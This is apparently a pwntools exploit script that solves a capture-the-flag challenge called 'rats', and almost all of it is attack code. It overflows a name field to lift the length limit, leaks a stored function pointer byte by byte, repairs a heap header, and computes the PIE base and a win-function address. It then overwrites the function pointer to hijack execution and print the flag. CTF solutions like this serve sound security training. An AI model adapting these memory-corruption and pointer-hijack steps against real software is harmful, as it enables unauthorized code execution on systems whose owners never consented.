#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host rats.challs.srdnlen.it --port 15002 ./rats
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rats')

context.terminal = ["urxvt", "-e", "bash", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'rats.challs.srdnlen.it'
port = int(args.PORT or 15002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start(env={"FLAG": "test{flag}"})

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

rat_mem_size = 0x28
rat_buffer_len = 17 # more specifically, there are 17 pointers to be saved on
                    # the stack

name_len_to_remove_limit = 15
name_len_to_leak_dialogue = 40
name_len_to_restore_heap = 24

payload = [
    b'1\n', # create new rat
    b'petiole :)\n',
    b'1\n', # create second rat, overwrite max rat name length
    b'rename me :)\n',
    b'1\n', # create third rat, overwrite `dialogue(rat*)` addr
    b'overwrite me :)\n',
    b'3\n1\n', # rename rat at index 1
    b'a' * name_len_to_remove_limit + b'\n', # remove name length limit
    b'2\n0\n', # greet rat at index 0 to flush stdout
]

io.send(b''.join(payload))

dialogue_ptr_bin = b''
addr_regex = re.compile(b"b*(.)\.\n")

for i in range(8):
    get_dialogue_ptr = [
        b'3\n1\n', # rename rat at index 1
        b'b' * (name_len_to_leak_dialogue + i) + b'\n', # remove characters leading up to
                                                     # saved stack addr, leak
                                                     # the i-th character
        b'2\n1\n', # greet the rat at index 1
    ]
    io.send(b''.join(get_dialogue_ptr))
    # print(io.recvuntil("bbbbbbbb"))
    io.recvuntil("bbbbbbbb")

    dialogue_ptr_str = io.recvline()
    print(dialogue_ptr_str)

    dialogue_ptr_bin = addr_regex.match(dialogue_ptr_str).group(1) + dialogue_ptr_bin
    print(f"current dialogue_ptr=0x{dialogue_ptr_bin.hex()}")

    del_rat = [
        b'3\n1\n', # rename rat at index 1
        b'b' * name_len_to_restore_heap,
        p64(0x31) + b'\n', # restore heap header thing
        b'4\n2\n', # delete rat at index 2
        b'1\n', # create rat at index 2, hopefully in old spot
        b'overwrite me :)\n',
    ]

    io.send(b''.join(del_rat))

# not likely to have `bb`. it may but not usually
dialogue_ptr_bin = dialogue_ptr_bin.replace(b'bb', b'')
dialogue_ptr = int.from_bytes(dialogue_ptr_bin, "big")

print(f"""
---[ recieved addr ]---
dialogue_ptr (bin) = {dialogue_ptr_bin}
dialogue_ptr (hex) = {hex(dialogue_ptr)}""")

# now, we have the address of dialogue, which is at offset 0x269
# win address is at offset 0x669
# thus, win_addr = dialogue_ptr - 0x269 + 0x669
base_addr = dialogue_ptr - 0x269
win_addr = base_addr + 0x669

print(f"""
base_addr    (hex) = {hex(base_addr)}
win_addr     (hex) = {hex(win_addr)}""")

ret_2_win = [
    b'3\n1\n', # rename rat at index 1
    b'c' * name_len_to_leak_dialogue,
    p64(win_addr), # write win address in the function pointer of dialogue
    b'\n',
    b'2\n2\n', # greet the third rat, which should now run win!
]

io.send(b''.join(ret_2_win))

# flush old stdout
io.recvuntil(b"number.\n")
io.recvuntil(b"number.\n")
io.recvuntil(b"number.\n")
io.recvuntil(b"number.\n")

# io.interactive()
flag = io.recvuntil(b'}')
log.success(flag)
